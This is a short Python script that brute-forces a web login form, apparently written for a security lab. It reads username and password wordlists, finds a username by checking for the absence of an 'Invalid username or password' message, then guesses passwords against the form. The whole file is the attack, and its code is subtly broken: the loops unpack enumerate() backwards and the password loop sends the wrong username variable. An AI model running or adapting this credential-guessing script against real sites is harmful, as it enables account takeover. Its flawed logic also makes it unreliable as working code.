from requests import Session

BASE_URL = ''
PATH = ''
USR_FILE = 'usernames.txt'
PWD_FILE = 'passwords.txt'

FULL_PATH = BASE_URL + PATH

with open(USR_FILE) as f:
    usernames = list(map(lambda x: x.strip(), f.readlines()))

with open(PWD_FILE) as f:
    passwords = list(map(lambda x: x.strip(), f.readlines()))

with Session() as s:

    valid_user = None
    # Brute force username first
    for username, index in enumerate(usernames):
        resp = s.post(FULL_PATH, data={
            'username': username,
            'password': 'a'
        })

        if ("Invalid username or password." in resp.content.decode()):
            continue

        valid_user = username
        print(valid_user)
        break

    assert valid_user is not None, "Username not found"

    for password, index in enumerate(passwords):
        resp = s.post(FULL_PATH, data={
            'username': username,
            'password': password
        })

        if('Invalid username or password' in resp.content.decode()):
            continue

        valid_password = password
        print(valid_password)
        break

